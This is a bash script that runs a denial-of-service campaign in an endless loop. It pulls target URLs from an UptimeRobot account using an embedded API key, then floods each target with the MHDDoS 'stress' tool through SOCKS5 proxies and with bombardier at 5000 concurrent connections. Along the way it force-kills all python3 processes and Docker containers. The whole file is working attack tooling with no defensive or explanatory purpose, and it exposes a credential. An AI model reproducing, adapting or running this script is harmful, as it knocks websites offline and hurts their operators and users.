#!/bin/bash
tmux new -s mh -d > /dev/null 2>&1
DURATION=60
while [ 1 ]; do
  PAGE=$(curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cache-Control: no-cache" -d 'api_key=ur1650084-49bb4fb61845b76b0b16fda7&format=json&logs=0' "https://api.uptimerobot.com/v2/getMonitors")
  rm MHDDoS/files/proxies/socks5.txt
  URLS=$(echo "$PAGE" | cut -d ':' -f5 | tr -dc '0-9')
  if [[ "$URLS" != "" ]]; then
    UP=$(echo "$PAGE"|sed 's/_name":"/@/'|cut -d '@' -f2|sed 's/_name":"/\n/g'|cut -d '"' -f1,2,5,6 |sed 's/"//g'| sed 's/@/\n/g' | cut -d ',' -f1,2 | shuf)
    while read -r L; do
      sleep 2
      kill -9 $(pidof python3) > /dev/null 2>&1
      if [[ $(docker ps -q | wc -l) > 0 ]]; then
        docker container kill $(docker container ls -q) > /dev/null 2>&1
      fi
      sleep 1
      echo "ATTACK URL: "$(echo "$L" | cut -d "," -f1)
      tmux send-keys -t mh 'python3 MHDDoS/start.py stress '$(echo "$L" | cut -d "," -f2)' 5 1000 socks5.txt 100 '$DURATION' true > /dev/null 2>&1' C-m
      docker run -d --rm alpine/bombardier -c 5000 -d "$DURATION"s  -l $(echo "$L" | cut -d "," -f2) > /dev/null 2>&1
      for x in {1..100} ; do sleep  $(bc <<< 'scale=2; '$DURATION'/100');    printf . ; done | pv -pt -i0.2 -s100 -w 64 > /dev/null
    done < <(printf '%s\n' "$UP")
  else
    echo URLs not found or bad!
    sleep 1
  fi
done

